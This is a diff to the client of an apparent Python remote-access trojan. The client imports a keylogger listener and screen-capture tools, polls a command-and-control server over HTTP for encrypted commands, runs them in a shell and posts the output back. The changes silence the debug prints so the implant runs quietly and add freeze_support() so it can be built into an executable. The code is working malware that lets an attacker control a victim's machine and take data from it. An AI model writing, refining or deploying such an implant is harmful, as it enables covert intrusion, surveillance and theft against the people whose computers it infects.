@@ -16,8 +16,8 @@ from pynput.keyboard import Listener, Controller, Key
 from PIL import ImageGrab, Image
 from rotatescreen import get_displays
 from winsound import PlaySound, SND_ASYNC
-from multiprocessing import Process
-
+from multiprocessing import Process, freeze_support
+from sys import exit
 from encryption import cipher
 # Settings Variables(Constants) Importing
 from settings import (CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, FILE_REQUEST,
@@ -55,6 +55,8 @@ def post_to_server(message: str, response_path=RESPONSE):
 
 # This Guard prevents our multiprocessing Process Calls from running our main codes
 if __name__ == "__main__":
+    # Use below Guard to Fixing multiprocessing when Building
+    freeze_support()
 
     def get_filename(input_string):
         """this is a function that split string and returns third item and greater items after that.
@@ -110,8 +112,10 @@ if __name__ == "__main__":
         if failed, Keep Trying forever.'''
         try:
             response = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encryptedClient}", headers=HEADERS, proxies=PROXY)
-            # print(f"{Fore.LIGHTYELLOW_EX}{client.split("@")[0]}{Fore.MAGENTA} => {Fore.LIGHTBLUE_EX}{response.status_code}{Fore.RESET}")
-            print(client.split("@")[0], "=>", response.status_code, sep=" ")
+
+            # test print
+            # print(client.split("@")[0], "=>", response.status_code, sep=" ")
+
             # if we got 404 status codes, raise an exception to jump to except block
             if response.status_code == 404:
                 raise exceptions.RequestException
@@ -133,8 +137,11 @@ if __name__ == "__main__":
             exit()
 
         # If we get a 204-Status Code from the Server, simply ReIterate the Loop with no sleep
+
+        # noinspection PyUnboundLocalVariable
         if response.status_code == 204:
-            print("[+] Server Command Command Executed and Result send to C2 Server.")
+            # test print
+            # print("[+] Server Command Command Executed and Result send to C2 Server.")
             continue
 
         # Retrieve the command from response and decode it
@@ -176,7 +183,8 @@ if __name__ == "__main__":
                 commandOutput = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout
 
                 # test print
-                print("[+] OS-System command Executed on client Foreground and results send back to the C2 Server.")
+                # print("[+] OS-System command Executed on client Foreground
+                # and results send back to the C2 Server.")
 
                 # Send the output to the server, must be decoding it first because subprocess.run() return bytes
                 post_to_server(commandOutput.decode())
@@ -493,11 +501,6 @@ if __name__ == "__main__":
 
         # Else, the wrong input, actually not a Built-in Command or Shell Command or Client/Server Commands
         else:
-            post_to_server("Wrong/Unknown Input!!! Not a Built-in Command or Shell Command. try again... \n")
-
-
-
-
-
+            post_to_server("[-] => Wrong/Unknown Input!!! \nNot a OS, Server or Client Command. try again... \n")
 
     print(Fore.LIGHTCYAN_EX + f"[+] Goodbye & Goodluck Ninja 🥷\n{client}" + Fore.RESET)
